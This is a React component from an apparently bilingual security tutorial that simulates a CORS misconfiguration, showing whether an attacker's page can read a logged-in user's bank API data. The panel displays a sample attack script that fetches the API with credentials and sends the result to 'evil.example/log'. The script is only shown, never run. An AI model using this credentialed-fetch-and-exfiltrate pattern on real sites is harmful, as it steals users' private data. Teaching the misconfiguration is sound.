import { useEffect, useRef, useState } from 'react';
import { useLang } from '../i18n.jsx';
import { Seg } from '../components/TopicShell.jsx';
import { API, CONFIGS, ORIGINS, SECRET, run } from './cors.js';

const L = (en, zh) => ({ en, zh });
// packet stops on the 560 × 220 diagram
const STOPS = { script: [99, 117], gate: [236, 117], api: [465, 117] };

/** The attacker's script asks the bank API for data; the browser decides whether it may read the answer. */
export default function CorsGate() {
  const { tr } = useLang();
  const [config, setConfig] = useState('reflect');
  const [origin, setOrigin] = useState(ORIGINS[0].value);
  const [res, setRes] = useState(null);
  const [phase, setPhase] = useState(-1);
  const timer = useRef(null);

  useEffect(() => () => clearInterval(timer.current), []);

  const go = () => {
    clearInterval(timer.current);
    const r = run(config, origin);
    setRes(r);
    setPhase(0);
    timer.current = setInterval(() => setPhase((p) => (p >= 4 ? (clearInterval(timer.current), p) : p + 1)), 700);
  };
  const reset = (fn) => (v) => {
    fn(v);
    setRes(null);
    setPhase(-1);
  };

  // route: script → gate → api → gate → script|stop
  const route = ['script', 'gate', 'api', 'gate', res?.check.ok ? 'script' : 'gate'];
  const at = phase >= 0 ? route[Math.min(phase, 4)] : 'script';
  const [x, y] = STOPS[at];
  const back = phase >= 3;
  const done = phase >= 4;
  const page = origin === 'null' ? tr(L('sandboxed iframe', '沙箱 iframe')) : origin.replace('https://', '');

  return (
    <div className="cors-viz">
      <div className="lab">
        <div className="panel">
          <Seg label={L('Bank API CORS policy', '银行 API 的 CORS 策略')} value={config} onChange={reset(setConfig)} options={Object.entries(CONFIGS).map(([value, c]) => ({ value, label: c.label }))} />
          <pre className="code small">{CONFIGS[config].code}</pre>
          <div className="field-label">{tr(L('Page the victim is on (its Origin)', '受害者所在的页面（它的 Origin）'))}</div>
          <div className="chips">
            {ORIGINS.map((o) => (
              <button type="button" key={o.value} className={`chip ${origin === o.value ? 'on' : ''}`} onClick={() => reset(setOrigin)(o.value)}>
                {o.label}
              </button>
            ))}
          </div>
          <p className="hint">{tr(ORIGINS.find((o) => o.value === origin).note)}</p>
          <pre className="code small">{`fetch("${API}/me", { credentials: "include" })\n  .then(r => r.text())\n  .then(d => send("https://evil.example/log", d))`}</pre>
          <button type="button" className="btn danger" onClick={go}>
            {tr(L('Run the script', '运行脚本'))}
          </button>
        </div>
        <div className="panel">
          <svg className="cors-svg" viewBox="0 0 560 220" role="img" aria-label={tr(L('The victim’s browser with the attacker page and the CORS check, and the bank API', '受害者浏览器（含攻击者页面和 CORS 检查）以及银行 API'))}>
            <rect x="8" y="16" width="310" height="196" rx="14" className="cors-browser" />
            <text x="22" y="38" className="n-sub">
              {tr(L('Alice’s browser (logged in to bank.example)', 'Alice 的浏览器（已登录 bank.example）'))}
            </text>
            <g transform="translate(24 82)">
              <rect width="150" height="70" rx="10" className="cors-box atk" />
              <text x="75" y="30" textAnchor="middle" className="n-label">
                {tr(L('Attacker’s script', '攻击者脚本'))}
              </text>
              <text x="75" y="50" textAnchor="middle" className="n-sub">
                {page.length > 22 ? `${page.slice(0, 21)}…` : page}
              </text>
            </g>
            <g transform="translate(196 66)">
              <rect width="80" height="102" rx="10" className={`cors-gate ${done ? (res.check.ok ? 'open' : 'shut') : ''}`} />
              <text x="40" y="50" textAnchor="middle" className="n-label">
                CORS
              </text>
              <text x="40" y="70" textAnchor="middle" className="n-sub">
                {tr(L('check', '检查'))}
              </text>
              {done && (
                <text x="40" y="92" textAnchor="middle" className={res.check.ok ? 'gate-ok' : 'gate-x'}>
                  {res.check.ok ? '✓' : '✕'}
                </text>
              )}
            </g>
            <line x1="318" y1="117" x2="390" y2="117" className="ssrf-link public" />
            <g transform="translate(390 82)">
              <rect width="150" height="70" rx="10" className="cors-box api" />
              <text x="75" y="30" textAnchor="middle" className="n-label">
                api.bank.example
              </text>
              <text x="75" y="50" textAnchor="middle" className="n-sub">
                GET /me
              </text>
            </g>
            {phase >= 0 && (
              <g className={`ssrf-packet ${back ? (res.check.ok ? 'loot' : 'stopped') : ''}`} style={{ transform: `translate(${x}px, ${y - 46}px)` }}>
                <circle r="9" />
              </g>
            )}
          </svg>

          <div className="cors-headers">
            <div>
              <div className="field-label">{tr(L('Request (sent by the browser)', '请求（由浏览器发出）'))}</div>
              <pre className="code small">{`GET /me HTTP/1.1\nHost: api.bank.example\nOrigin: ${origin}\nCookie: session=alice-91c2`}</pre>
            </div>
            <div>
              <div className="field-label">{tr(L('Response headers', '响应头'))}</div>
              <pre className="code small">
                {phase >= 2 && res
                  ? `HTTP/1.1 200 OK\n${Object.entries(res.headers)
                      .map(([k, v]) => `${k}: ${v}`)
                      .join('\n') || tr(L('(no CORS headers)', '（没有 CORS 头）'))}`
                  : '…'}
              </pre>
            </div>
          </div>
          <div className="console" aria-live="polite">
            <div className="console-head">
              <span>{tr(L('Console on the attacker’s page', '攻击者页面的控制台'))}</span>
            </div>
            {!done && <div className="console-empty">{phase >= 0 ? '…' : tr(L('Run the script to see what it can read.', '运行脚本，看看它能读到什么。'))}</div>}
            {done && phase >= 2 && <div className="console-line">› {tr(L('The bank received the request with Alice’s cookie and answered 200. The server always sees it.', '银行收到了带 Alice Cookie 的请求，并返回了 200。服务器一定会收到请求。'))}</div>}
            {done && (res.check.ok ? <div className={`console-line ${res.stolen ? 'bad' : 'good'}`}>{res.stolen ? '💥 ' : '✓ '}{SECRET}</div> : <div className="console-line good">⛔ {tr(L(`Blocked by CORS policy: ${tr(res.check.why)}. The script gets nothing.`, `被 CORS 策略拦截：${tr(res.check.why)}。脚本什么也读不到。`))}</div>)}
          </div>
          {done && (
            <div className={`verdict ${res.stolen ? 'bad' : 'good'}`}>
              {res.stolen
                ? tr(L('The browser let another origin read Alice’s private data, with her cookie. The server’s CORS policy invited it.', '浏览器允许另一个来源带着 Alice 的 Cookie 读取她的私人数据。是服务器的 CORS 策略主动放行的。'))
                : res.legit
                  ? tr(L('The real site may read its own API. This is what CORS is for.', '真正的网站可以读取自己的 API，这正是 CORS 的用途。'))
                  : tr(L('Safe: the request happened, but the attacker cannot read the answer.', '安全：请求发生了，但攻击者读不到响应。'))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
